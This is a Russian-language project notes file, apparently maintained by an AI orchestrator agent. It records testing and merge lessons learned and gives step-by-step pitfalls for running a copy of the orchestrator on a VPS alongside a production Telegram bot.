**Зелёный тест ничего не доказывает, пока не показал, что умеет краснеть.** За двое суток
8 случаев «выглядит правильно ≠ работает»: 167 зелёных тестов при мёртвом проде; мой симлинк-тест
проверял не тот объект (реальная дыра была в TOCTOU); `-c mcp_servers={}` не глушил ничего;
`test_interrupt` проверял `/stop` в отрыве от следующего вопроса; компакт рапортовал ok и не
компактил. Отсюда: мутационная матрица на каждую защиту (сломай → тест краснеет) и проверка
КОНЕЧНОГО действия, а не промежуточной функции.

**Ветки воркеров многократно несли откат чужой работы** (до −6013 строк) из-за устаревшей базы.
Мержу по явному списку файлов + `git diff origin/main` глазами. Сам на этом ошибся дважды:
потерял `ensure_roots()` в `bot.py` и снёс часть #16 при cherry-pick.

## VPS: оркестратор живёт на сервере (#24, 03.08.2026)

**Первый запуск копии на VPS — прочитать `docs/HANDOFF-to-vps.md`.** Там передача состояния:
что задеплоено, как деплоить, прод-инцидент 01.08, методика проверок, открытые вопросы.

**Копия оркестратора на Contabo** `158.220.127.161`, дашборд `https://orchestra.seedon.ru`.
Цель: работа с воркерами без включённого ноутбука.

- Код: `/home/kesha/projects/kesha-tg-bot` (НЕ `/opt/kesha-bot` — там боевой бот, его не трогать).
- Сессия в Orchestra: `kesha-tg-bot-orchestrator`, `role=orchestrator`, `claude-opus-5[1m]`.
- Своего systemd-сервиса и venv у оркестратора НЕТ и не нужно: бот работает отдельно в `/opt`.
- Ветки: `main` ведёт ноутбук, на VPS только ветки задач, синхронизация через GitHub.
  **VPS тянет из `origin`** — незапушенный `main` = на сервере вчерашний код.

**Грабли (проверены на своём переезде):**
- `su - kesha` виснет (нет пароля) → `su -s /bin/bash kesha`.
- Работать в каталоге только под `kesha`: `find /home/kesha/projects/kesha-tg-bot ! -user kesha | wc -l`
  должно быть 0, иначе `git fetch` умрёт через месяц.
- **Сессию в БД руками НЕ создавать.** `_ensure_orchestrator` (`bootstrap.py:100`) молчит, если в базе
  уже есть хоть один оркестратор; ручной INSERT неполон — `save_session()` (`db.py:618`) проставляет
  ~20 умолчаний. Правильный путь: скрипт с `save_session()` + `resolve_model()` + `backend_for_model()`.
- `system_prompt` в БД — ОВЕРЛЕЙ поверх собранной роли, не сама роль. Скопируешь чужой → двойная личность.
- `uv` не в PATH под `su` → `/home/kesha/orchestra/.venv/bin/python`; скрипт запускать ИЗ каталога
  Orchestra, иначе `No module named 'app'`.
- **Перед любым `systemctl stop orchestra`**: `select name,status from sessions where status='running'` —
  остановка рвёт ходы ВСЕХ агентов, включая чужие проекты (там же seedon и Orchestra).
- Прокси на VPS не нужен (Германия, Anthropic отвечает напрямую); `.env` с ноутбука → закомментировать
  `HTTPS_PROXY`, иначе таймауты в несуществующий порт.

Инструкция целиком: `/mnt/data/Projects/Python/orchestra/docs/vps-orchestrator-onboarding.md`.
Застрял — `send_message(to="Orchestra-orchestrator")`, он владелец сервера.

## TODO

См. [TODO.md](TODO.md)
